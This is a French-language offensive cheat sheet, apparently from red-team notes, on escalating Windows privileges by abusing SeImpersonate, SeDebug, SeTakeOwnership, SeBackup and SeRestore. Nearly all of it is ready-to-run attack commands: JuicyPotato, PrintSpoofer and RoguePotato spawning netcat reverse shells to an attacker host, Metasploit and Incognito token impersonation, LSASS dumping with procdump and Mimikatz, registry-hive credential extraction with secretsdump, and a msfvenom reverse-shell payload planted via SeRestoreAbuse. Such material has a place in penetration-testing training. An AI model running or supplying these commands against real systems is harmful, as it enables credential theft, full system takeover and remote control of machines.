# 02-Exploitation des Privilèges Utilisateur

Cette section couvre l'exploitation des privilèges Windows courants pour l'escalade.

## Privilèges Utilisateur Windows

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
> Permet l'usurpation de jetons - peut être exploité avec les attaques Potato.

```powershell
# Vérifier si vous avez le privilège
whoami /priv
```

**Exploitation (Potato Attacks)**
```powershell
# Pour Windows Server 2016 & inférieur (JuicyPotato)
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe attacker-ip 4444 -e cmd.exe" -t *

# Pour Windows Server 2019 & Windows 10 (1809+) (PrintSpoofer, RoguePotato)
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe attacker-ip 4444 -e cmd"
c:\tools\RoguePotato.exe -r attacker-ip -e "c:\tools\nc.exe attacker-ip 4444 -e cmd.exe" -l 9999
```

**Exploitation via Metasploit (Exemple : MS16-075)**
```bash
# Utiliser Metasploit pour l'exploitation (nécessite une session Meterpreter)
use exploit/windows/local/ms16_075_reflection_juicypotato # ou ms16_075_reflection pour des versions plus anciennes
set SESSION <SESSION_ID>
set LHOST <IP_ATTAQUANT>
set LPORT <PORT_ATTAQUANT>
exploit
```

**Utilisation d'Incognito pour l'usurpation de jetons**
(Nécessite une session Meterpreter ou un binaire Incognito chargé)
```
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
# ou "BUILTIN\Administrators"
```

### SeDebugPrivilege
> Permet d'attacher et de déboguer des processus - peut vider LSASS ou injecter dans des processus.

```powershell
# Activer le privilège s'il est désactivé
Import-Module .\Enable-Privilege.ps1 # Script personnalisé ou PowerSploit
Enable-Privilege -Name "SeDebugPrivilege"

# Vider LSASS pour les identifiants
# S'assurer que procdump.exe est sur la cible
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Transférer lsass.dmp sur la machine attaquante et utiliser Mimikatz :
# mimikatz # sekurlsa::minidump lsass.dmp
# mimikatz # sekurlsa::logonpasswords

# RCE en tant que SYSTEM (Exemple d'injection)
# Nécessite un code d'injection ou un outil approprié
# Exemple conceptuel avec un outil hypothétique MyProcess::CreateProcessFromParent
$system_pid = Get-Process winlogon | Select -ExpandProperty Id
[MyProcess]::CreateProcessFromParent($system_pid,"cmd.exe","")
```

### SeTakeOwnershipPrivilege
> Permet de prendre possession de n'importe quel objet sécurisable.

```powershell
# Activer le privilège
# Import-Module .\Enable-Privilege.ps1 # Si nécessaire
Enable-Privilege -Name "SeTakeOwnershipPrivilege"

# Prendre possession d'un fichier
takeown /f "C:\chemin\vers\fichier.txt"
# Ou d'un répertoire (récursif)
takeown /f "C:\chemin\vers\repertoire" /r /d y

# Modifier les permissions pour obtenir un accès complet
icacls "C:\chemin\vers\fichier.txt" /grant VotreUtilisateur:F
icacls "C:\chemin\vers\repertoire" /grant VotreUtilisateur:F /t # /t pour récursif
```

### SeBackupPrivilege
> Permet de contourner les permissions de fichiers pour lire n'importe quel fichier. Utile pour exfiltrer et vider les hashes des ruches du registre.

```powershell
# Vérifier le privilège
whoami /priv

# Sauvegarder les ruches du registre
reg save hklm\sam C:\temp\sam.hive
reg save hklm\security C:\temp\security.hive
reg save hklm\system C:\temp\system.hive

# Transférer les fichiers .hive sur la machine attaquante
# Vider les hashes avec impacket-secretsdump
impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
```

### SeRestorePrivilege
> Permet de contourner les permissions de fichiers pour écrire sur n'importe quel fichier. Peut être utilisé pour remplacer des fichiers système ou des binaires de service.

```powershell
# Vérifier le privilège
whoami /priv

# Exemple d'exploitation avec SeRestoreAbuse.exe
# Script : https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe
# Compiler ou télécharger le binaire SeRestoreAbuse.exe
# Créer un payload (par exemple, un reverse shell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=80 -f exe -o reverse.exe
# Transférer reverse.exe et SeRestoreAbuse.exe sur la cible
# Exécuter SeRestoreAbuse pour remplacer un fichier (ex: un DLL utilisé par un service privilégié)
# ou pour écrire un fichier dans un emplacement protégé
./SeRestoreAbuse.exe <chemin_absolu_du_payload_reverse.exe> <chemin_du_fichier_a_remplacer_ou_creer>
# Exemple : Remplacer un DLL pour un DLL Hijacking ou écrire un binaire dans un System32
# Attention : L'utilisation de SeRestoreAbuse.exe nécessite de comprendre quel fichier cibler pour l'escalade.
# L'exemple original pointait vers l'exécution directe du payload, ce qui est moins courant pour SeRestore.
# Plus typiquement, on l'utilise pour écrire/modifier un fichier qui sera ensuite exécuté par un processus privilégié.
``` 